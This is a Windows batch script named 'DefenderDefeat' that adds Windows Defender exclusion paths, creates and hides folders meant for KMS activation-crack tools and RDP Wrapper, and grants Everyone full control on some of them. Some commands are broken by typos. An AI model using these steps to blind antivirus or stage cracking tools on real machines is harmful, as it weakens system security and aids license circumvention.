@echo on
rem *******************************************************
rem
rem InitialCreate.bat
rem This Script Creates the Protect Folders on Drive C:
rem
rem PARAMETERS:	NONE
rem RETURNS:	0 if Success Script Runs
rem		16 if Check Integrity Error
rem		17 if Runs without Elevated Privileges
rem
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=DefenderDefeat
SET FIRM_NAME=NIT

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
echo Define Folders...
rem
set pathCMD=%SystemRoot%\System32
set allDefeatPath=%TEMP%\AllDefeat

rem Set OS Architecture
Set xOS=x64 & If "%PROCESSOR_ARCHITECTURE%"=="x86" If Not Defined PROCESSOR_ARCHITEW6432 Set xOS=x86

echo Define Protected Directories...
rem
set UTIL=c:\Util
set NITSYS=C:\NIT.SYSUPDATE
set PUB1=C:\pub1
set PUB=C:\pub
set TEMPPUB=%PUB1%\Distrib
set ZLPUB=%PUB1%\Distrib\Zlovred
set UTILPUB=%PUB1%\Util
set inetpub=C:\inetpub
set ip_wwwroot=%inetpub%\wwwroot
set dotbin=C:\.BIN
set CAdir=C:\CA
set ELEVATION=C:\ELEVATION
set NITPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%
set PRODPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%\%PRODUCT_NAME%
rem ## set DirMSSQLSR=C:\Users\MSSQLSR
set Dir64RServer=%SystemRoot%\System32\rserver30
set Dir32RServer=%SystemRoot%\sysWOW64\rserver30
set AutoIt64=%ProgramFiles%\AutoIt3
set Pwsh64=%ProgramFiles%\PowerShell
set AutoIt32=%ProgramFiles(x86)%\AutoIt3
set Pwsh32=%ProgramFiles(x86)%\PowerShell
set PY27X64=C:\Python27.x64
set PY27X86=C:\Python27.x86
set PY38X64=C:\Python38.x64
set PY38X86=C:\Python38.x86
set PYCHOC=C:\Python312
rem ## set UsPrKMS=%UserProfile%\Downloads\KMS.Tools
set UsPrPwsh=%UserProfile%\Documents\PowerShell
set UsPrWPwsh=%UserProfile%\Documents\WindowsPowerShell
set RDPWrapPath="%ProgramFiles%\RDP Wrapper"
set RDPWrapPath=%RDPWrapPath:"=%
set C_TOOLS=C:\tools
rem
rem Define KMS Dirs
rem
rem ## set UsKMSTools=%UserProfile%\Downloads\KMS.Tools
set AactTools=%SystemRoot%\AAct_Tools
set AactTFiles=%SystemRoot%\Aact_Tools\AAct_files
set SRKMS=%SystemRoot%\KMS
set SRKMSAutoS=%SystemRoot%\KMSAutoS
rem
rem Define KMS Files
rem
set SppHook=%pathCMD%\SppExtComObjHook.dll
set SppPatcher=%pathCMD%\SppExtComObjPatcher.exe
rem
rem Define Auxiliary Files...
rem
set AresLag=%Util%\areslag1234.exe
set AresRag=%Util%\aresrag1234.exe
set DefRevl=%UTIL%\defrevl1234.exe
set DefRevr=%UTIL%\defrevr1234.exe
set RnDn=%UTIL%\RunsDownloaded.exe

echo Define Programs...
set CMDEXE=%pathCMD%\cmd.exe
set ATTRIBEXE=%pathCMD%\attrib.exe
set FINDEXE=%pathCMD%\find.exe
set ICACLSEXE=%pathCMD%\icacls.exe
set FSUTILEXE=%pathCMD%\fsutil.exe
set WPWSHEXE=%pathCMD%\WindowsPowerShell\v1.0\powershell.exe

echo Check Integrity...
rem
if not exist %pathCMD% echo %pathCMD% not found && exit /b 16
if not exist %pathCMD%\attrib.exe echo %pathCMD%\attrib.exeis not found && exit /b 1
if not exist %FINDEXE% echo %FINDEXE% not exists && exit /b 16
if not exist %CMDEXE% echo %CMDEXE% not exists && exit /b 16
if not exist %ATTRIBEXE% echo %ATTRIBEXE% not exists && exit /b 16
if not exist %ICACLSEXE% echo %ICACLSEXE% not exists && exit /b 16
if not exist %FSUTILEXE% echo %FSUTILEXE% not exists && exit /b 16
if not exist %WPWSHEXE% echo %WPWSHEXE% not exists && exit /b 16
if not exist %temp% echo %temp% not exists && exit /b 16
if not exist %TPDL% echo %TPDL% not exists && exit /b 16
if not exist "%ALLUSERSPROFILE%" echo %ALLUSERSPROFILE% not found && exit /b 16
if not exist %pathCMD% echo %pathCMD% not exists && exit /b 16
if not exist "%ProgramFiles%" echo %ProgramFiles% not exists && exit /b 16
if not exist C:\Users echo C:\Users not exists && exit /b 16
if %xOS%==x86 goto EndCheckInt
if not exist "%ProgramFiles(x86)%" echo %ProgramFiles(x86)% not found && exit /b 16
if not exist %systemRoot%\sysWOW64 echo %systemRoot%\sysWOW64 not found && exit /b 16
:EndCheckInt

echo Create All Defeat Path...
rem
if not exist %allDefeatPath% md %allDefeatPath%

title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
exit /b 17
rem
set getadminvbs=nitdefeat-initialcreate.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\%getadminvbs%"

    %wscriptexe% "%temp%\%getadminvbs%"
    del "%temp%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

echo Protect your own Folders
rem
%WPWSHEXE% -NoProfile -ExecutionPolicy Bypass -command "Add-MpPreference -ExclusionPath C:\ProgramData\NIT"
%WPWSHEXE% -NoProfile -ExecutionPolicy Bypass -command "Add-MpPreference -ExclusionPath C:\.BIN"
%WPWSHEXE% -NoProfile -ExecutionPolicy Bypass -command "Add-MpPreference -ExclusionPath C:\pub1"
%WPWSHEXE% -NoProfile -ExecutionPolicy Bypass -command "Add-MpPreference -ExclusionPath C:\Util"

echo Created Protected Directories
rem
if not exist %UTIL% md %UTIL% && %pathCMD%\attrib.exeis +H %UTIL%
if not exist %NITSYS% md %NITSYS% && %pathCMD%\attrib.exeis +H %NITSYS%
if not exist %PUB1% md %PUB1% && %pathCMD%\attrib.exeis +H %PUB1%
if not exist %TEMPPUB% md %TEMPPUB% && %pathCMD%\attrib.exeis +H %TEMPPUB%
if not exist %UTILPUB% md %UTILPUB% && %pathCMD%\attrib.exeis +H %UTILPUB%
if not exist %ZLPUB% md %ZLPUB% && %pathCMD%\attrib.exeis +H %ZLPUB%
if not exist %inetpub% md %inetpub% && %pathCMD%\attrib.exeis +H %inetpub%
if not exist %ip_wwwroot% md %ip_wwwroot% && %pathCMD%\attrib.exeis -H %inetpub%
if not exist %dotbin% md %dotbin% && %pathCMD%\attrib.exeis +H %dotbin%
if not exist %CAdir% md %CAdir% && %pathCMD%\attrib.exeis +H %CAdir%
if not exist %ELEVATION% md %ELEVATION% && %pathCMD%\attrib.exeis +H %ELEVATION%
if not exist "%NITPROFILE%" md "%NITPROFILE%"
if not exist "%PRODPROFILE%" md "%PRODPROFILE%"
rem === *** ===
rem if not exist "%PY27X64%" md "%PY27X64%" 
rem if not exist "%PY27X86%" md "%PY27X86%" 
rem if not exist "%PY38X64%" md "%PY38X64%" 
rem if not exist "%PY38X86%" md "%PY38X86%" 
rem if not exist "%PYCHOC" md "%PYCHOC"%" 
rem ## if not exist "%UsPrKMS%" md "%UsPrKMS%"
if not exist "%UsPrPwsh%" md "%UsPrPwsh%" 
if not exist "%UsPrWPwsh%" md "%UsPrWPwsh%" 
rem ## if not exist %DirMSSQLSR% md %DirMSSQLSR% 
if not exist %Dir64RServer% md %Dir64RServer% 
rem if not exist "%AutoIt64%" md "%AutoIt64%" 
if not exist "%Pwsh64%" md "%Pwsh64%" 
if not exist "%RDPWrapPath%" md "%RDPWrapPath%" 
if not exist "%C_TOOLS%" md "%C_TOOLS%" 
rem === *** ===
rem ## if not exist "%UsKMSTools%" md "%UsKMSTools%" 
if not exist %AactTools% md %AactTools% 
if not exist %AactTFiles% md %AactTFiles% 
if not exist %SRKMS% md %SRKMS% 
if not exist %SRKMSAutoS% md %SRKMSAutoS% 
if %xOS%==x86 goto EndCreateProtected
if not exist %Dir32RServer% md %Dir32RServer% 
if not exist "%AutoIt32%" md "%AutoIt32%" 
if not exist "%Pwsh32%" md "%Pwsh32%" 
:EndCreateProtected

echo Hide Protected Directory...
rem
if exist %UTIL% %ATTRIBEXE% +H %UTIL% && echo %UTIL% now hidden
if exist %NITSYS% %ATTRIBEXE% +H %NITSYS% && echo %NITSYS% now hidden
if exist %PUB1% %ATTRIBEXE% +H %PUB1% && echo %PUB1% now hidden
if exist %TEMPPUB% %ATTRIBEXE% +H %TEMPPUB% && echo %TEMPPUB% now hidden
if exist %UTILPUB% %ATTRIBEXE% +H %UTILPUB% && echo %UTILPUB% now hidden
if exist %ZLPUB% %ATTRIBEXE% +H %ZLPUB% && echo %ZLPUB% now hidden
if exist %inetpub% %ATTRIBEXE% +H %inetpub% && echo %inetpub% now hidden
if exist %ip_wwwroot% %ATTRIBEXE% -H %ip_wwwroot% && echo %ip_wwwroot% now hidden
if exist %dotbin% %ATTRIBEXE% +H %dotbin% && echo %dotbin% now hidden
if exist %CAdir% %ATTRIBEXE% +H %CAdir% && echo %CAdir% now hidden
if exist %ELEVATION% %ATTRIBEXE% +H %ELEVATION% && echo %ELEVATION% now hidden
if exist "%NITPROFILE%" %ATTRIBEXE% +H "%NITPROFILE%" && echo "%NITPROFILE%" now hidden

echo Set ACLs...
rem
if exist %ZLPUB% %ICACLSEXE% "%ZLPUB%" /grant *S-1-1-0:F /t /inheritance:e
if exist %Util% %ICACLSEXE% "%Util%" /grant *S-1-1-0:F /t /inheritance:e

echo Create Empty Files...
rem
rem if not exist %SppHook% %FSUTILEXE% file createnew %SppHook% 1024 
rem if not exist %SppPatcher% %FSUTILEXE% file createnew %SppPatcher% 1024 
rem if not exist %AresLag% %FSUTILEXE% file createnew %AresLag% 1024 
rem if not exist %AresRag% %FSUTILEXE% file createnew %AresRag% 1024 
rem if not exist %DefRevl% %FSUTILEXE% file createnew %DefRevl% 1024 
rem if not exist %DefRevr% %FSUTILEXE% file createnew %DefRevr% 1024 
rem if not exist %RnDn% %FSUTILEXE% file createnew %RnDn% 1024 

:End
rem echo The End of the Script
exit /b 0

